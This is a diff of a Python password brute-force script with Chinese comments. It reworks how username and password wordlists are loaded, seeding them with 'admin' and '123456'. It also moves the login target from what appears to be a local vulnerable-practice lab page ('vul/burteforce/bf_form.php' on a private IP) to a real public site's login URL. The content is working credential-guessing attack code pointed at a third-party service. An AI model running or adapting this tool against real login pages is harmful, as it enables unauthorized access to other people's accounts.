@@ -6,15 +6,15 @@ from datetime import datetime, timedelta
 # 禁用https警告
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-# 字典路径，置空就不读取
-#USERNAME_DIC = "/root/bruteforce/username.txt"
-#PASSWORD_DIC = "/root/bruteforce/password.txt"
-USERNAME_DIC = "D:\\Bruteforce\\username.txt"
-PASSWORD_DIC = "D:\\Bruteforce\\password.txt"
-
 # 字典
-USERNAME = []
-PASSWORD = []
+USERNAME = ["admin"]   # USERNAME = USERNAME + USERNAME_EXTENSION_DIC
+PASSWORD = ["123456"]  # PASSWORD = PASSWORD + PASSWORD_EXTENSION_DIC
+
+# 字典文件路径，空字符串或None就不读取
+#USERNAME_EXTENSION_DIC = "/root/bruteforce/username.txt"
+#PASSWORD_EXTENSION_DIC = "/root/bruteforce/password.txt"
+USERNAME_EXTENSION_DIC = "D:\\Bruteforce\\username.txt"
+PASSWORD_EXTENSION_DIC = "D:\\Bruteforce\\password.txt"
 
 # 只爆破一个账号
 ONLY_ONCE = False
@@ -35,22 +35,22 @@ PROXIES = {
 }
 
 # 加载用户名字典
-try:
-    if USERNAME_DIC:
-        with open(USERNAME_DIC, "r") as f:
-            USERNAME = f.readlines()
-except Exception as e:
-    print(f"[x] Cannot open '{USERNAME_DIC}' file {e}")
-    os._exit(0)
+if USERNAME_EXTENSION_DIC:
+    try:
+        with open(USERNAME_EXTENSION_DIC, "r") as f:
+            USERNAME.extend(f.readlines())
+    except Exception as e:
+        print(f"[x] Cannot open '{USERNAME_EXTENSION_DIC}' file {e}")
+        os._exit(0)
 
 # 加载密码字典
-try:
-    if PASSWORD_DIC:
-        with open(PASSWORD_DIC, "r") as f:
-            PASSWORD = f.readlines()
-except Exception as e:
-    print(f"[x] Cannot open '{PASSWORD_DIC}' file {e}")
-    os._exit(0)
+if PASSWORD_EXTENSION_DIC:
+    try:
+        with open(PASSWORD_EXTENSION_DIC, "r") as f:
+            PASSWORD.extend(f.readlines())
+    except Exception as e:
+        print(f"[x] Cannot open '{PASSWORD_EXTENSION_DIC}' file {e}")
+        os._exit(0)
 
 # 设置Headers
 HEADERS = requests.utils.default_headers()
@@ -70,7 +70,7 @@ def bruteforce(username, password):
     time.sleep(DELAY)
     
     try:
-        url = "http://172.29.133.44/vul/burteforce/bf_form.php"
+        url = "http://baidu.com/login"
         data = {
             "username": username,
             "password": password,
